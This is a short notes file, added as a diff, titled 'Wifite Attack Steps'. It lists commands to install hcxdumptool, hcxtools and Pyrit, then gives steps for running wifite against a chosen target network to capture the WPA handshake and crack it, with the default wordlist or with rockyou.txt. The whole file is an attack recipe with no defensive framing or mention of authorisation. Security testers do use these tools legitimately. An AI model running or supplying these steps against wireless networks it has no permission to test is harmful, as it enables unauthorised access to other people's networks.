@@ -1,0 +1,34 @@
+	Wifite Attack Steps
+	
+Run these commands in root terminal
+
+------ wifite Required package ----
+
+apt install hcxdumptool
+
+apt install hcxtools
+
+apt-get install libpcap-dev
+
+git clone https://github.com/JPaulMora/Pyrit.git
+
+
+------ wifite attack using default dictionary ----
+wifite
+ctrl+c 
+enter target user no.
+ctrl+c start again attack by enter c
+wait till handshake done
+
+
+------ wifite attack using specific dictionary ----
+
+wifite --wpa --dict /usr/share/wordlists/rockyou.txt --kill  
+ctrl+c 
+enter target user no.
+ctrl+c start again attack by enter c
+wait till handshake done
+
+
+
+
